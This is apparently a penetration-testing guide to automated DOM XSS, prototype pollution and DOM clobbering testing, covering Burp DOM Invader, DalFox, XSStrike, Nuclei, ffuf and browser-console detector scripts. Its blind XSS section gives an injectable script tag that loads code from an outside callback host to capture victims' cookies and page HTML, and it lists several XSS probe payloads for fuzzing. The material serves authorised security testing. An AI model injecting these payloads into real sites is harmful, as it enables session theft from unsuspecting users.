# DOM Vulnerabilities — Tools and Automation

## When this applies

You're setting up automated DOM XSS / DOM clobbering / prototype pollution scanning, integrating with CI/CD, or running reconnaissance with custom scripts. Covers Burp Suite tooling, standalone scanners, Nuclei templates, browser-console snippets, and blind XSS infrastructure.

## Technique

Combine: (1) Burp DOM Invader for guided exploration, (2) custom JS console snippets for source/sink/clobbering enumeration, (3) Nuclei + ffuf for at-scale scanning, (4) XSS Hunter / blind XSS service for stored-XSS callbacks, (5) DalFox / XSStrike for parameter analysis.

## Steps

### Burp Suite DOM Invader

**Features:**
- Automatic source detection
- Sink identification
- Prototype pollution scanning
- Gadget discovery
- DOM clobbering detection
- One-click exploitation

**Setup:**
1. Open Burp Suite Professional
2. Launch Burp's built-in browser
3. Press F12 → DOM Invader tab
4. Enable DOM Invader

**Configuration:**
```
- Canary: Custom test string
- Inject URL params: Auto-inject into parameters
- Inject forms: Auto-inject into form inputs
- Show sinks: Display detected sinks
- Show sources: Display detected sources
- Prototype pollution: Enable scanning
- DOM clobbering: Enable detection
```

**Workflow:**
1. Navigate to target page
2. DOM Invader auto-injects canary
3. Review "Sources" panel for injection points
4. Review "Sinks" panel for dangerous functions
5. Click sinks to see stack traces and context
6. Scan for prototype pollution
7. Scan for gadgets
8. Generate exploits automatically

### XSS Hunter (Blind XSS)

**Purpose:** Detect blind XSS

**Setup:**
```html
<script src="https://your-xsshunter.com/your-id"></script>
```

**Features:**
- Captures page HTML
- Screenshots
- Cookies
- Origin information
- HTTP referrer

**Payload injection:**
```
"><script src=https://your-xsshunter.com/id></script>
```

### DalFox

**Installation:**
```bash
go install github.com/hahwul/dalfox/v2@latest
```

**Basic usage:**
```bash
# Single URL
dalfox url https://target.com?param=value

# From file
dalfox file urls.txt

# Pipeline mode
cat urls.txt | dalfox pipe

# With custom payloads
dalfox url https://target.com?q=test --custom-payload payloads.txt
```

**Advanced options:**
```bash
# DOM analysis
dalfox url https://target.com?param=value --mining-dom

# Include all parameters
dalfox url https://target.com?a=1&b=2 --mining-all-param

# With blind XSS
dalfox url https://target.com?param=value --blind https://xsshunter.com/id
```

### XSStrike

**Installation:**
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
```

**Usage:**
```bash
# Basic scan
python xsstrike.py -u "https://target.com?param=value"

# With crawling
python xsstrike.py -u "https://target.com" --crawl

# Fuzzing mode
python xsstrike.py -u "https://target.com?param=value" --fuzzer

# Skip DOM scanning
python xsstrike.py -u "https://target.com?param=value" --skip-dom
```

### Custom Scripts

#### JavaScript Source/Sink Finder

```javascript
// Run in browser console
(function() {
    // Sources
    const sources = [
        'location.search',
        'location.hash',
        'location.href',
        'document.referrer',
        'document.cookie',
        'window.name'
    ];

    // Sinks
    const sinks = [
        'innerHTML',
        'outerHTML',
        'document.write',
        'document.writeln',
        'eval',
        'Function',
        'setTimeout',
        'setInterval',
        'location',
        'location.href'
    ];

    console.log('=== DOM XSS Detection ===');

    // Check for sources in page scripts
    document.querySelectorAll('script').forEach(script => {
        let code = script.textContent;
        sources.forEach(source => {
            if (code.includes(source)) {
                console.log(`[SOURCE FOUND] ${source} in script`);
            }
        });
        sinks.forEach(sink => {
            if (code.includes(sink)) {
                console.log(`[SINK FOUND] ${sink} in script`);
            }
        });
    });
})();
```

#### Prototype Pollution Detector

```javascript
// Run in browser console
(function() {
    console.log('=== Testing Prototype Pollution ===');

    // Test __proto__
    let testObj1 = {};
    Object.prototype.polluted = 'yes';

    if (testObj1.polluted === 'yes') {
        console.log('[VULNERABLE] Prototype pollution possible');
        console.log('[TEST] Try: /?__proto__[test]=polluted');
    }

    // Clean up
    delete Object.prototype.polluted;

    // Check for common pollution sources
    let url = new URL(window.location.href);
    url.searchParams.forEach((value, key) => {
        if (key.includes('__proto__') || key.includes('constructor') || key.includes('prototype')) {
            console.log(`[ALERT] Potential pollution vector in URL: ${key}`);
        }
    });
})();
```

#### DOM Clobbering Detector

```javascript
// Run in browser console
(function() {
    console.log('=== Testing DOM Clobbering ===');

    // Check for clobberable variables
    let suspiciousVars = [];

    for (let prop in window) {
        let val = window[prop];
        if (val && typeof val === 'object') {
            if (val instanceof HTMLElement || val instanceof HTMLCollection) {
                suspiciousVars.push(prop);
            }
        }
    }

    if (suspiciousVars.length > 0) {
        console.log('[FOUND] Potentially clobbered variables:');
        suspiciousVars.forEach(v => {
            console.log(`  - window.${v} =`, window[v]);
        });
    }

    // Test if we can clobber
    console.log('[TEST] Try adding: <a id="testClobber"></a>');
})();
```

### Automated Scanning

#### Nuclei Template for DOM XSS

```yaml
id: dom-xss-detection

info:
  name: DOM XSS Detection
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?param=<img src=x onerror=alert(1)>"
      - "{{BaseURL}}/#<img src=x onerror=alert(1)>"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<img src=x onerror=alert(1)>"
        part: body

      - type: status
        status:
          - 200
```

#### ffuf-Based Payload Fuzzing

While sqlmap is for SQL injection, similar automated approaches can test for DOM XSS:

```bash
# Create payload list
cat > dom-payloads.txt << EOF
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
{{alert(1)}}
EOF

# Use with ffuf
ffuf -w dom-payloads.txt -u https://target.com/?FUZZ
```

## Verifying success

- DOM Invader populates Sources and Sinks panels with concrete entries.
- DalFox / XSStrike output flags candidate parameters with PoC payloads.
- Nuclei template returns matched lines for vulnerable parameters.
- XSS Hunter dashboard receives callbacks from victim browsers.
- Custom console scripts log expected source/sink/clobbering candidates.

## Common pitfalls

1. **DOM Invader requires Burp Pro** — Community edition doesn't include it.
2. **XSS Hunter requires self-hosting (post-shutdown)** — community fork at `xsshunter.com` (verify status before relying on it).
3. **DalFox / XSStrike scan reflected XSS, not DOM XSS** — they test what's in the response body. DOM XSS may not appear in HTTP response. Combine with DOM Invader.
4. **Nuclei templates miss client-only sinks** — they grep response, not the rendered DOM. Use Playwright + DOM eval for true DOM XSS detection at scale.
5. **Custom console scripts run after CSP** — `script-src` may block your snippet. Paste in DevTools console (privileged context).

## Tools

- **Burp Suite Pro / DOM Invader** — primary client-side testing
- **OWASP ZAP** — open-source alternative
- **DalFox** — fast XSS scanner
- **XSStrike** — XSS detection suite
- **DOMPurify (test config)** — verify sanitizer doesn't strip your test payload
- **XSS Hunter** — blind XSS callback service
- **PayloadsAllTheThings (`patt-fetcher`)** — payload library
- **Nuclei** — template-based scanning
- **Playwright + headless DOM eval** — at-scale DOM XSS detection
